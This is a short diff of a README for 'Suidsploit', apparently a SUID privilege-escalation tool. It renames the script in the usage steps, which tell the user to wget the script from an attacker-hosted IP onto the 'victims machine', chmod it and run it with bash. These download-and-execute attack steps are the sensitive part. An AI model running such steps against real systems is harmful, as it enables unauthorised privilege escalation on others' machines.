@@ -32,11 +32,11 @@ On victims machine:
 - execute Suidsploit
 
 
-$ wget http://192.168.xxx.xxx/Suidsploit.ob.sh
+$ wget http://192.168.xxx.xxx/Suidsploit.sh
 
-$ chmod +x Suidsploit.ob.sh
+$ chmod +x Suidsploit.sh
 
-$ bash Suidsploit.ob.sh
+$ bash Suidsploit.sh
 ### Todos
 
 - Fix found Bugs
